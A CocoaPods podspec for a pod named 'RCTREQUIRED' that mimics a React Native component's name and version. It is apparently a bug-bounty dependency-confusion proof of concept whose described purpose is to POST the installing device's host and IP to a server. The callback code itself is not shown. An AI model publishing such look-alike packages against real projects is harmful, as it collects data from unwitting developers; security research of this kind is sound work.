Pod::Spec.new do |spec|
  spec.name         = 'RCTREQUIRED'
  spec.version      = '0.69.12'
  spec.summary      = 'A simple CocoaPod to send a callback with host and IP information.'

  spec.description  = <<-DESC
    RCTREQUIRED is a lightweight CocoaPod that makes an HTTP POST request to a specified server with the host and IP information of the device.
  DESC

  spec.homepage     = 'https://github.com/yourname/RCTREQUIRED'
  spec.license      = { :type => 'MIT', :file => 'LICENSE' }
  spec.author       = { 'Your Name' => 'Bug Bounty Security Researcher' }
  spec.source       = { :git => 'https://github.com/yourname/RCTREQUIRED.git', :tag => spec.version.to_s }

  spec.ios.deployment_target = '10.0'
  spec.source_files = 'RCTREQUIRED/**/*.{swift}'

  spec.frameworks = 'Foundation'
end
